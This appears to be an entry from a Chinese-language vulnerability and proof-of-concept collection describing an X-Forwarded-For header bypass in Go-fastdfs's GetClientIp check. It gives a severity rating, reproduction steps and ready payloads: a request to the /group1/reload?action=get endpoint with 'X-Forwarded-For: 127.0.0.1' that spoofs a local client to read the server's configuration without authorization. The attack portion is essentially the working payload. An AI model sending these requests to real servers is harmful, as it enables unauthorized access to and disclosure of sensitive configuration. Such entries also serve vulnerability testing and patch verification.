# Go-fastdfs GetClientIp 未授权访问漏洞

## 漏洞描述
Go-fastdfs GetClientIp方法存在XFF头绕过漏洞，攻击者通过漏洞可以未授权调用接口，获取配置文件等敏感信息

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
主页面

![image-20230417094508409](images/image-20230417094508409.png)

调用读取配置接口，返回 ip 不允许访问

```
/group1/reload?action=get
```


## Payloads
```
/group1/reload?action=get
```
```
/group1/reload?action=get

X-Forwarded-For: 127.0.0.1
```
